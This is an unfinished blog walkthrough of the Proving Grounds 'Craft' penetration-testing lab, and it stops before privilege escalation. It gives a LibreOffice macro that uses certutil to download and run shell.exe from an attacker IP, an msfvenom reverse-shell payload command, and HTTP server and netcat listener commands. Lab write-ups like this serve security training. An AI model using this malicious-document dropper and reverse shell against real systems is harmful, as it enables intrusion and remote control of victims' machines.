---
title: Craft
date: 2026-01-17T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - macros
  - proving-grounds
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Craft"
---
Unfinished! 

![](Screenshot%202026-01-16%20at%2013.55.41.png)


![](Screenshot%202026-01-16%20at%2018.54.54.png)

Create a document.odt in Libre. 
Navigate to: Tools > Macros > Organise Macros > Basic 
	
![](Screenshot%202026-01-16%20at%2018.57.17.png)

Create a new macro and inset the following code:

`
	Sub Main
	    Shell("cmd /c certutil -urlcache -f http://192.168.45.168:81/shell.exe C:\Windows\Temp\shell.exe && C:\Windows\Temp\shell.exe")
	End Sub
`

![](Screenshot%202026-01-16%20at%2019.00.37.png)


New create a msfvenom package:

` msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.168 LPORT=1234 -f exe -o shell.exe`

Start a http server and listener in another tab:

`python -m http.server 81`

`rlwrap nc -lvnp 1234`

![](Screenshot%202026-01-16%20at%2019.03.30.png)

![](Screenshot%202026-01-16%20at%2019.05.10.png)

Once I got to this stage I struggled, eventually I looked up a guide and found that I needed to escalate to the apache user. 

